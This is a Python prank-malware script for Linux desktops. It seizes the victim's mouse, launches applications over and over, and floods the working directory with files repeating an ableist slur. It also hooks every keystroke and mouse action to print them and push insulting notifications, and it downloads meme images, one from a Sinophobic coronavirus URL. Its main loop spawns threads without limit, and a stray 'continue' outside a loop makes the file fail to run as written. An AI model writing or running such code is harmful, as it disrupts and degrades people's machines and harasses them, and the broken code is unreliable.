#!/bin/env python3

import os
import time
import platform

import random
import urllib.request

from pynput.mouse import Listener
from pynput import keyboard
from Xlib import X, display

from threading import *
import string

import requests
import sys

from PIL import Image

# Download memes

def memes():
    meme_list = ["https://coalregioncanary.com/wp-content/uploads/2020/02/coronavirus-chinese-student-meme.jpg",
    "https://i1.wp.com/nintendosoup.com/wp-content/uploads/2020/04/the-coffin-dance-meme-is-recreated-in-mario-kart-wii-J9JlRLSGxjk.jpg?resize=1038%2C576&ssl=1",
    "https://ultramunch.com/wp-content/uploads/2020/01/1579853440151-min.png"] # MEMES, what the fuck am i doing with my life

    name = names_gen() #  Getting File name

    random_meme = random.choice(meme_list) # picking meme
    print(random_meme) # for testing 403 errors

    urllib.request.urlretrieve(random_meme, name)
    time.sleep(5)
    img = Image.open(name)
    img.show() # opening image

# Fuck With The PC [Part]

def names_gen(str_length=15): # this is supposed to be up but i cba moving
    list = os.listdir() # Checking Files In List
    print(list)
    DELIMETER = ''

    while True:
        random_shit = string.ascii_letters + string.digits + string.ascii_lowercase # string
        random_shit = DELIMETER.join((random.choice(random_shit) for i in range(str_length))) #Totally forgot what this does
        if not random_shit in list:
            break
        else:
            continue
    return random_shit # return

def file_writer():
    while True:
        random_shit = names_gen() # getting name
        time.sleep(1) # for threading break
        if platform.system() == "Linux":
            with open(random_shit, 'x+') as f: # this will just make the file and write to it, we can do this because we checked for duplicates in names_gen
                print(random_shit)
                f.write("Hehe You Are Retard "*500)
            time.sleep(10)
            open_file = f'gedit {random_shit};kate {random_shit};leafpad {random_shit}'
            os.system(open_file) # Running Command

def random_open():
    print("Working")
    while True:
        time.sleep(.8)
        if platform.system() == 'Linux':
            apps = ['sensible-browser','discord','dolphin','nautilus','terminal','konsole','files','systemsettings5'] # random linux apps
            app_chosen = random.choice(apps)
            app_open = app_chosen
            os.system(app_open) # Running Command
        continue # GOD FUCKING DAMN IT


# Mouse Section

def random_move(): # Moving Mouse
    while True:
        random_time = random.uniform(0,1.5)

        time.sleep(random_time)

        random_number = random.uniform(0,2)

        randx = random.randint(0,1920)
        randy = random.randint(0,1080)

        d = display.Display() # i don't fucking know what this does
        s = d.screen()
        root = s.root
        root.warp_pointer(int(randx * random_number),int(randy * random_number)) # Moving The Mouse
        d.sync() # god kill me

def on_move(x, y): # XY cordinates
    print(f'Mouse Moved {x} {y} ')
    print('Action Performed')
    if platform.system() == "Linux":
        notifiction = "notify-send 'Retard' 'Hehe Retard You Moved Your Mouse'"
        os.system(notifiction) # God kill me, This Just calls the  function


def on_click(x,y,button,pressed): # Buttons Pressed
    print(f'Button Click at {x} {y} with {button}')
    print('Action Performed')
    if platform.system() == "Linux":
            notifiction = "notify-send 'Retard' 'Hehe Retard You Clicked Your Mouse'"
            os.system(notifiction)


def on_scroll(x,y,dx,dy): # Scrolling cordinates
    print(f"Mouse Scrolled to [{dx} {dy}]")
    print('Action Performed')
    if platform.system() == "Linux":
            notifiction = "notify-send 'Retard' 'Hehe Retard You Scrolled'"
            os.system(notifiction)


# Keyboard Section


def on_press(key):
    print('Key {} pressed.'.format(key))
    if platform.system() == "Linux":
            notifiction = "notify-send 'Retard' 'Hehe Retard You Pressed A Button'"
            os.system(notifiction)


def on_release(key):
    print('Key {} released.'.format(key))
    if platform.system() == "Linux":
            notifiction = "notify-send 'Retard' 'Hehe Retard You Released A Button'"
            os.system(notifiction)


# Start Mouse Tracking
def start_mouse(on_move,on_click,on_scroll):
    with Listener(on_move=on_move, on_click=on_click,on_scroll=on_scroll) as listener:
        listener.join() # Starting

# Start Keyboard Logging
def start_keyboard(on_press,on_release):
    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()

threads = []

try:
    while True: # makes it work
        p1 = Thread(target=start_mouse, args=(on_move,on_click,on_scroll))
        p2 = Thread(target=start_keyboard, args=(on_press, on_release))
        p3 = Thread(target=random_move)
        p4 = Thread(target=random_open)
        p5 = Thread(target=file_writer)
        p6 = Thread(target=memes)

        p1.start()
        time.sleep(20)
        p2.start()
        time.sleep(10)
        p3.start()
        time.sleep(5)
        p4.start()
        p5.start()
        p6.start()
        time.sleep(5)
        threads.append(p4)
        threads.append(p5)
        threads.append(p6)
    for thread in threads:
        thread.join()
except KeyboardInterrupt:
    print("No")
    continue
